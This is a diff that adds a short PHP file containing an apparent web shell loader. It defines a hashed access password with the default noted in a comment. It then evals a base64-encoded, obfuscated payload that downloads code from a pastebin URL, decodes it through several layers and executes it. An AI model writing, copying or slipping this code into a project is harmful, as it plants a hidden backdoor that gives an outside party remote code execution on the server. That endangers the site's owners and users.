@@ -1,0 +1,3 @@
+<?php
+$auth_pass = "48ba8138756afc71fa1b3c37fa27d2a5"; // default: zeeblaxx
+eval(base64_decode(("JG5vbmFtZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdodHRwOi8vcGFzdGViaW4uY29tL3Jhdy9XOVpjbUpIaycpOw0KZXZhbChzdHJfcm90MTMoZ3ppbmZsYXRlKHN0cl9yb3QxMyhiYXNlNjRfZGVjb2RlKCRub25hbWUpKSkpKTs=")));
